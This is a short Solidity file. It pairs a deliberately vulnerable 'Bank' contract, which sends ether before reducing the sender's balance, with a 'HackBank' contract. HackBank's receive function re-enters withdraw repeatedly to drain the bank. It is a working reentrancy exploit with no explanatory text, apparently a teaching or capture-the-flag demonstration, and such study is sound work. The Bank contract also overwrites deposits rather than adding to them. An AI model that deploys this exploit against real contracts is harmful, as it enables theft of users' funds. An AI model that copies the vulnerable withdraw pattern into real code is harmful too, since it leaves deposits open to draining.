pragma solidity 0.8.17;

contract Bank {

    mapping(address => uint256) public balances;

    constructor() payable {
        require(msg.value == 2 ether);
    }

    function deposit() external payable {
        balances[msg.sender] = msg.value;
    }

    function withdraw(uint256 amount) external {
        require(amount <= balances[msg.sender], "insufficient funds");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "withdraw failed");
        balances[msg.sender] -= amount;
    }

    function getBalance() view public returns(uint balance){
        balance = address(this).balance;
    }
}

contract HackBank{
    Bank bank;
    uint256 funds;
    constructor (address _address){
        bank = Bank(_address);
    }

    function proxyDeposit() external payable {
        funds = msg.value;
        bank.deposit{value : msg.value}();
    }

    function attack() external payable {
        bank.withdraw(funds);
    }

    receive() external payable {
        if (bank.getBalance() >= funds) {
            bank.withdraw(funds);                }
        
    }

    function getBalance() view public returns(uint balance){
                    balance = address(this).balance;
    
    }
 }

